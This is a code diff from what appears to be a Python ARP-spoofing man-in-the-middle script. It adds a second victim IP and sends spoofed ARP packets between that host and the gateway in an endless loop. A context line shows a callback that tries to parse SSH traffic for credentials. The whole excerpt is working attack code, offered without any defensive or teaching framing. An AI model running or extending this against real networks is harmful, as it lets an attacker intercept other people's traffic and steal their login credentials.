@@ -31,13 +31,16 @@ def packet_callback(packet):
             # Attempt to parse SSH traffic for credentials
 
 target_ip = "10.0.0.11"  
-gateway_ip = "10.0.0.1"  
+gateway_ip = "10.0.0.1"
+bob_ip = "10.0.0.12"  
 
 try:
     sent_packets_count = 0
     while True:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
+        spoof(bob_ip, gateway_ip)
+        spoof(gateway_ip, bob_ip)
         sent_packets_count += 2
         print(f"\r[*] Packets Sent: {sent_packets_count}", end="")
         time.sleep(2)  # Waits for two seconds
